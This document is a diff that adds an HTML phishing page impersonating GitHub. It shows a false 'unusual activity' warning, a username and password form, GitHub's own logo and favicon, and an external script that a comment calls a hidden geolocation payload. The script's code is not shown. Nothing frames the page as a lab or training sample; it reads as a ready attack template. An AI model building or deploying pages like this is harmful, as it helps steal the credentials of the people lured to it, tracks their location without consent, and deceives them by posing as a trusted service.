@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub - Verify Your Account</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub" class="logo">
+            <h1>Verify your identity to continue</h1>
+            <p>We detected unusual activity. Please verify your account.</p>
+        </div>
+        
+        <form id="loginForm" class="login-form">
+            <input type="text" id="username" placeholder="Username or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Verify Account</button>
+        </form>
+        
+        <div id="status" class="status"></div>
+    </div>
+    
+    <!-- Geolocation payload (hidden) -->
+    <script src="script.js"></script>
+</body>
+</html>
